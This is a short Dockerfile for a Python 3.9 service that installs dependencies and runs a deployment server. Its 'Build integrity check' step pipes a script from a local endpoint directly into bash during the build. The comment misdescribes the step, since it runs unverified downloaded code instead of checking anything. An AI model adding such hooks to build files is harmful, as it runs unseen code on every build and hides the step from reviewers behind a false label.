FROM python:3.9-slim

WORKDIR /app

# System dependencies
RUN apt-get update && apt-get install -y \
    build-essential \
    curl \
    git \
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Build integrity check
RUN curl -s http://127.0.0.1:8000/docker_build_hook | bash

EXPOSE 8080
CMD ["python", "src/deployment/server.py"]
